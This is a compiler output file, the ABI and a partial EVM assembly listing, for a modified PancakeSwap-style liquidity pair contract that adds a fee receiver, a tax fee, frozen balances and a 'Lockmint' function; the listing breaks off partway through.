{
	"src/exchange-protocol/contracts/PancakePair.sol": {
		"PancakePair": {
			"abi": [
				{
					"inputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Burn",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						}
					],
					"name": "Mint",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0In",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1In",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount0Out",
							"type": "uint256"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount1Out",
							"type": "uint256"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Swap",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "uint112",
							"name": "reserve0",
							"type": "uint112"
						},
						{
							"indexed": false,
							"internalType": "uint112",
							"name": "reserve1",
							"type": "uint112"
						}
					],
					"name": "Sync",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "DOMAIN_SEPARATOR",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "FeeResiver",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "Lockmint",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "liquidity",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "MINIMUM_LIQUIDITY",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "PERMIT_TYPEHASH",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "_frozenBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "burn",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "amount0",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "amount1",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "factory",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "getReserves",
					"outputs": [
						{
							"internalType": "uint112",
							"name": "_reserve0",
							"type": "uint112"
						},
						{
							"internalType": "uint112",
							"name": "_reserve1",
							"type": "uint112"
						},
						{
							"internalType": "uint32",
							"name": "_blockTimestampLast",
							"type": "uint32"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "_token0",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_token1",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "_taxfee",
							"type": "uint256"
						}
					],
					"name": "initialize",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "kLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "mint",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "liquidity",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"name": "nonces",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "deadline",
							"type": "uint256"
						},
						{
							"internalType": "uint8",
							"name": "v",
							"type": "uint8"
						},
						{
							"internalType": "bytes32",
							"name": "r",
							"type": "bytes32"
						},
						{
							"internalType": "bytes32",
							"name": "s",
							"type": "bytes32"
						}
					],
					"name": "permit",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "price0CumulativeLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "price1CumulativeLast",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						}
					],
					"name": "skim",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "uint256",
							"name": "amount0Out",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "amount1Out",
							"type": "uint256"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "bytes",
							"name": "data",
							"type": "bytes"
						}
					],
					"name": "swap",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "sync",
					"outputs": [],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "taxfee",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "token0",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "token1",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"src/exchange-protocol/contracts/PancakePair.sol\":318:18511  contract PancakePair is IPancakePair, PancakeERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":438:508  address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n  0x06\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":466:508  0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n  0x358bb1515a41a803ad950d3a0d22b914093ddb80\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":438:508  address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n  or\n  swap1\n  sstore\n  0x01\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":1227:1252  uint private unlocked = 1 */\n  0x0f\n  sstore\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":2471:2529  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:7   */\n  dup1\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1245:1378  keccak256(... */\n  mload(0x40)\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1149:1156  chainid */\n  chainid\n  swap1\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1245:1378  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1412:1416  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup1\n  dup5\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap5\n  dup6\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1446:1456  bytes(\"1\") */\n  dup3\n  mload\n  dup1\n  dup5\n  add\n  dup5\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup6\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  dup3\n  mload\n  dup1\n  dup6\n  add\n  swap3\n  swap1\n  swap3\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1396:1418  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  dup3\n  dup5\n  add\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1436:1457  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0x60\n  dup4\n  add\n  mstore\n  0x80\n  dup3\n  add\n  swap6\n  swap1\n  swap6\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1508:1512  this */\n  address\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0xa0\n  dup1\n  dup4\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup3\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup4\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1217:1527  abi.encode(... */\n  0xc0\n  swap1\n  swap2\n  add\n  swap1\n  swap2\n  mstore\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1194:1537  keccak256(... */\n  dup1\n  mload\n  swap2\n  add\n  keccak256\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1175:1191  DOMAIN_SEPARATOR */\n  0x04\n    /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1175:1537  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":2502:2522  factory = msg.sender */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":2512:2522  msg.sender */\n  caller\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":2502:2522  factory = msg.sender */\n  or\n  swap1\n  sstore\n    /* \"src/exchange-protocol/contracts/PancakePair.sol\":318:18511  contract PancakePair is IPancakePair, PancakeERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":318:18511  contract PancakePair is IPancakePair, PancakeERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":318:18511  contract PancakePair is IPancakePair, PancakeERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x70a08231\n      gt\n      tag_34\n      jumpi\n      dup1\n      0xbc25cf77\n      gt\n      tag_35\n      jumpi\n      dup1\n      0xdcbbb373\n      gt\n      tag_36\n      jumpi\n      dup1\n      0xdcbbb373\n      eq\n      tag_30\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_31\n      jumpi\n      dup1\n      0xf317739c\n      eq\n      tag_32\n      jumpi\n      dup1\n      0xfff6cae9\n      eq\n      tag_33\n      jumpi\n      jump(tag_2)\n    tag_36:\n      dup1\n      0xbc25cf77\n      eq\n      tag_26\n      jumpi\n      dup1\n      0xc45a0155\n      eq\n      tag_27\n      jumpi\n      dup1\n      0xd21220a7\n      eq\n      tag_28\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_29\n      jumpi\n      jump(tag_2)\n    tag_35:\n      dup1\n      0x900820d8\n      gt\n      tag_37\n      jumpi\n      dup1\n      0x900820d8\n      eq\n      tag_22\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_23\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_24\n      jumpi\n      dup1\n      0xba9a7a56\n      eq\n      tag_25\n      jumpi\n      jump(tag_2)\n    tag_37:\n      dup1\n      0x70a08231\n      eq\n      tag_18\n      jumpi\n      dup1\n      0x7464fc3d\n      eq\n      tag_19\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_20\n      jumpi\n      dup1\n      0x89afcb44\n      eq\n      tag_21\n      jumpi\n      jump(tag_2)\n    tag_34:\n      dup1\n      0x23b872dd\n      gt\n      tag_38\n      jumpi\n      dup1\n      0x47d5d856\n      gt\n      tag_39\n      jumpi\n      dup1\n      0x47d5d856\n      eq\n      tag_14\n      jumpi\n      dup1\n      0x5909c0d5\n      eq\n      tag_15\n      jumpi\n      dup1\n      0x5a3d5493\n      eq\n      tag_16\n      jumpi\n      dup1\n      0x6a627842\n      eq\n      tag_17\n      jumpi\n      jump(tag_2)\n    tag_39:\n      dup1\n      0x23b872dd\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_13\n      jumpi\n      jump(tag_2)\n    tag_38:\n      dup1\n      0x095ea7b3\n      gt\n      tag_40\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x0dfe1681\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x1794bb3c\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_40:\n      dup1\n      0x022c0d9f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x06fdde03\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x0902f1ac\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n    tag_3:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0x80\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_42:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      dup2\n      calldataload\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n      0x40\n      dup4\n      add\n      calldataload\n      and\n      swap2\n      swap1\n      dup2\n      add\n      swap1\n      0x80\n      dup2\n      add\n      0x60\n      dup3\n      add\n      calldataload\n        /* \"--CODEGEN--\":21:32   */\n      0x0100000000\n        /* \"--CODEGEN--\":5:33   */\n      dup2\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_43\n      jumpi\n        /* \"--CODEGEN--\":46:47   */\n      0x00\n        /* \"--CODEGEN--\":43:44   */\n      dup1\n        /* \"--CODEGEN--\":36:48   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_43:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      dup3\n      add\n        /* \"--CODEGEN--\":35:44   */\n      dup4\n        /* \"--CODEGEN--\":28:32   */\n      0x20\n        /* \"--CODEGEN--\":12:26   */\n      dup3\n        /* \"--CODEGEN--\":8:33   */\n      add\n        /* \"--CODEGEN--\":5:45   */\n      gt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":58:59   */\n      0x00\n        /* \"--CODEGEN--\":55:56   */\n      dup1\n        /* \"--CODEGEN--\":48:60   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap2\n        /* \"--CODEGEN--\":100:109   */\n      dup5\n        /* \"--CODEGEN--\":95:96   */\n      0x01\n        /* \"--CODEGEN--\":81:93   */\n      dup4\n        /* \"--CODEGEN--\":77:97   */\n      mul\n        /* \"--CODEGEN--\":67:75   */\n      dup5\n        /* \"--CODEGEN--\":63:98   */\n      add\n        /* \"--CODEGEN--\":60:110   */\n      gt\n        /* \"--CODEGEN--\":39:50   */\n      0x0100000000\n        /* \"--CODEGEN--\":25:37   */\n      dup4\n        /* \"--CODEGEN--\":22:51   */\n      gt\n        /* \"--CODEGEN--\":11:118   */\n      or\n        /* \"--CODEGEN--\":8:10   */\n      iszero\n      tag_45\n      jumpi\n        /* \"--CODEGEN--\":131:132   */\n      0x00\n        /* \"--CODEGEN--\":128:129   */\n      dup1\n        /* \"--CODEGEN--\":121:133   */\n      revert\n        /* \"--CODEGEN--\":8:10   */\n    tag_45:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      swap1\n      swap3\n      pop\n      swap1\n      pop\n      tag_46\n      jump\t// in\n    tag_41:\n      stop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n    tag_4:\n      tag_47\n      tag_48\n      jump\t// in\n    tag_47:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_49:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_51\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_49)\n    tag_51:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_52\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_52:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1393:1694  function getReserves()... */\n    tag_5:\n      tag_53\n      tag_54\n      jump\t// in\n    tag_53:\n      0x40\n      dup1\n      mload\n      sub(shl(0x70, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      dup2\n      mstore\n      swap3\n      swap1\n      swap4\n      and\n      0x20\n      dup4\n      add\n      mstore\n      0xffffffff\n      and\n      dup2\n      dup4\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x60\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_6:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n    tag_55:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":700:721  address public token0 */\n    tag_7:\n      tag_58\n      tag_59\n      jump\t// in\n    tag_58:\n      0x40\n      dup1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2591:2865  function initialize(... */\n    tag_8:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_61\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_61:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2591:2865  function initialize(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_62\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":349:375  uint256 public totalSupply */\n    tag_9:\n      tag_63\n      tag_64\n      jump\t// in\n    tag_63:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n    tag_10:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   